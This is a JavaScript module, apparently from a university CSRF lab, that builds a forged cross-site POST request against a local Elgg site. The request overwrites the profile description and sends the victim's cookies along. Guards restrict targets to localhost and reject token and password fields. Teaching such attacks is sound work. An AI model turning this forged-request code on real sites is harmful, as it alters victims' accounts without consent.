// Pure request construction shared by the browser and Node's tests.
export function assertLocalTarget(value) {
  const url = new URL(value);
  if (url.protocol !== 'http:' || url.username || url.password ||
      !['elgg.csrf.localhost', 'localhost', '127.0.0.1'].includes(url.hostname) ||
      url.search || url.hash) {
    throw new Error('Chỉ chấp nhận HTTP endpoint Elgg cục bộ, không có query/credentials.');
  }
  return url;
}

export function buildBody({ studentId, fields }) {
  if (!/^\d{8}$/.test(studentId)) throw new Error('MSV phải có 8 chữ số.');
  if (!Array.isArray(fields) || !fields.length) throw new Error('Chưa có trường từ Network.');
  const result = new URLSearchParams();
  let hasDescription = false;
  for (const entry of fields) {
    if (!Array.isArray(entry) || entry.length !== 2 || entry.some(x => typeof x !== 'string')) {
      throw new Error('Mỗi trường phải là cặp [tên, giá trị chuỗi].');
    }
    const [key, value] = entry;
    if (/token|password|cookie|authorization/i.test(key) || key === '__elgg_ts') {
      throw new Error('Không nhập token, timestamp xác thực, mật khẩu hoặc cookie vào attacker.');
    }
    if (key === 'description') {
      if (hasDescription) throw new Error('description bị lặp.');
      hasDescription = true;
      result.append(key, `CSRF attack by ${studentId}`);
    } else {
      result.append(key, value);
    }
  }
  if (!hasDescription) throw new Error('Cần xác nhận trường description trong Network trước.');
  return result;
}

export function requestOptions(body, mode = 'cors') {
  if (!['cors', 'no-cors'].includes(mode)) throw new Error('Invalid fetch mode');
  // URLSearchParams generates a CORS-safelisted content type automatically.
  // Do not add custom headers, especially Cookie or X-Requested-With.
  return { method: 'POST', mode, credentials: 'include', body, redirect: 'follow' };
}
